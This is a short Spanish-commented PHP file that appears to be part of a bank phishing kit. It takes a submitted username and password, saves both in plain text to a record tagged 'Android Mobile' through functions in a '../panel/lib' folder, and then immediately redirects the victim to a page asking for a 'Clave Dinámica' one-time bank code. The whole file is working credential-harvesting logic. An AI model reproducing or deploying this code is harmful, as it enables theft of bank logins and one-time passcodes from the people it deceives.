<?php
// process/pasousuario.php
require('../panel/lib/funciones.php');

$user = $_POST['txt-usuario'] ?? '';
$pass = $_POST['txt-password'] ?? ''; 
$dispositivo = "Android Mobile"; 

if (!empty($user) && !empty($pass)) {
    // 1. Guardamos el registro
    $id = crear_registro($user, $dispositivo);
    actualizar_registro_pass($id, $pass);
    
    // 2. AUTOFLUJO: Mandamos a pedir la Clave Dinámica inmediatamente
    header("Location: ../a/dinamica.php");
} else {
    header("Location: ../index.php");
}
exit();
